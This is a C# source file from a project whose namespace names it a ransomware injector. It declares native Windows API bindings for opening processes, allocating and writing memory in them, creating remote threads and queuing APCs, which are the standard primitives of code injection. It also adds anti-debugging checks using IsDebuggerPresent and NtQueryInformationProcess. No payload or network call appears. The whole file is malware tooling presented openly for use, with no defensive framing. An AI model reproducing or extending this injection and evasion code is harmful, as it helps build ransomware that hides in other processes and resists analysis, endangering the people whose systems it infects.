using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Ransomware.Injector;

internal partial class Kernel32
{
    /// <summary>
    /// Opens an existing local process object.
    /// </summary>
    /// <param name="processAccess">Access rights to the process.</param>
    /// <param name="bInheritHandle">Indicates whether the handle is inheritable.</param>
    /// <param name="processId">The identifier of the process to be opened.</param>
    /// <returns>An IntPtr handle to the process.</returns>
    [LibraryImport("kernel32.dll", SetLastError = true)]
    internal static partial IntPtr OpenProcess(
        uint processAccess,
        [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle,
        int processId);

    /// <summary>
    /// Opens an existing thread object and returns a handle that can be used for thread operations.
    /// </summary>
    /// <param name="dwDesiredAccess">The access rights requested for the thread.</param>
    /// <param name="bInheritHandle">Indicates whether the handle can be inherited by child processes.</param>
    /// <param name="dwThreadId">The identifier of the thread to be opened.</param>
    /// <returns>
    /// A handle to the opened thread if successful; otherwise, <see cref="nint.Zero"/>.
    /// Call <see cref="GetLastError"/> to retrieve error information if the function fails.
    /// </returns>
    [LibraryImport("kernel32.dll", SetLastError = true)]
    internal static partial nint OpenThread(
        uint dwDesiredAccess,
        [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle,
        uint dwThreadId);

    /// <summary>
    /// Allocates memory in the virtual address space of a specified process.
    /// </summary>
    /// <param name="hProcess">Handle to the process.</param>
    /// <param name="lpAddress">Desired starting address of the allocation.</param>
    /// <param name="dwSize">Size of the allocation in bytes.</param>
    /// <param name="flAllocationType">Type of memory allocation.</param>
    /// <param name="flProtect">Memory protection for the region.</param>
    /// <returns>The base address of the allocated region.</returns>
    [LibraryImport("kernel32.dll", SetLastError = true)]
    internal static partial IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);

    /// <summary>
    /// Writes data to an area of memory in a specified process.
    /// </summary>
    /// <param name="hProcess">Handle to the process.</param>
    /// <param name="lpBaseAddress">Base address in the specified process to which data is written.</param>
    /// <param name="lpBuffer">Array of bytes to be written.</param>
    /// <param name="nSize">Number of bytes to write.</
    /// <param name="lpNumberOfBytesWritten">Outputs the number of bytes written.</param>
    /// <returns>True if the operation succeeds; otherwise, false.</returns>
    [LibraryImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    internal static partial bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        [MarshalAs(UnmanagedType.LPArray)] byte[] lpBuffer,
        uint nSize,
        out int lpNumberOfBytesWritten);

    /// <summary>
    /// Creates a thread that runs in the virtual address space of another process.
    /// </summary>
    /// <param name="hProcess">Handle to the process.</param>
    /// <param name="lpThreadAttributes">Pointer to a SECURITY_ATTRIBUTES structure.</param>
    /// <param name="dwStackSize">Initial size of the stack, in bytes.</param>
    /// <param name="lpStartAddress">Pointer to the application-defined function to be executed by the thread.</param>
    /// <param name="lpParameter">Pointer to a variable to be passed to the thread function.</param>
    /// <param name="dwCreationFlags">Flags that control the creation of the thread.</param>
    /// <param name="lpThreadId">Outputs the thread identifier.</param>
    /// <returns>Handle to the new thread.</returns>
    [LibraryImport("kernel32.dll")]
    internal static partial IntPtr CreateRemoteThread(
        IntPtr hProcess,
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out IntPtr lpThreadId);

    /// <summary>
    /// Queues an Asynchronous Procedure Call (APC) to the specified thread.
    /// The thread must be in an alertable state for the APC to be executed.
    /// </summary>
    /// <param name="pfnAPC">A pointer to the APC function to be executed.</param>
    /// <param name="hThread">A handle to the thread where the APC should be queued.</param>
    /// <param name="dwData">An application-defined value passed to the APC function.</param>
    /// <returns>
    /// If the function succeeds, the return value is nonzero.
    /// If the function fails, the return value is zero. To get extended error information, call <see cref="GetLastError"/>.
    /// </returns>
    [LibraryImport("kernel32.dll")]
    internal static partial IntPtr QueueUserAPC(
        IntPtr pfnAPC,
        IntPtr hThread,
        IntPtr dwData);

    /// <summary>
    /// Closes an open object handle.
    /// </summary>
    /// <param name="hObject">Handle to an open object.</param>
    /// <returns>True if the handle is successfully closed; otherwise, false.</returns>
    [LibraryImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    internal static partial bool CloseHandle(IntPtr hObject);

    /// <summary>
    /// Checks if the calling process is being debugged.
    /// </summary>
    /// <returns>
    /// Returns <c>true</c> if the calling process is being debugged; otherwise, <c>false</c>.
    /// </returns>
    [LibraryImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    internal static partial bool IsDebuggerPresent();

    /// <summary>
    /// Retrieves the calling thread's last-error code value.
    /// </summary>
    /// <returns>
    /// The last-error code of the calling thread.
    /// </returns>
    [LibraryImport("kernel32.dll")]
    internal static partial uint GetLastError();

    [LibraryImport("ntdll.dll", SetLastError = true)]
    private static partial int NtQueryInformationProcess(
        nint processHandle,
        int processInformationClass,
        ref int processInformation,
        int processInformationLength,
        out int returnLength);

    internal static bool IsBeingDebugged()
    {
        int isDebugged = 0;
        _ = NtQueryInformationProcess(Process.GetCurrentProcess().Handle, 7, ref isDebugged, sizeof(int), out _);
        return isDebugged != 0;
    }
}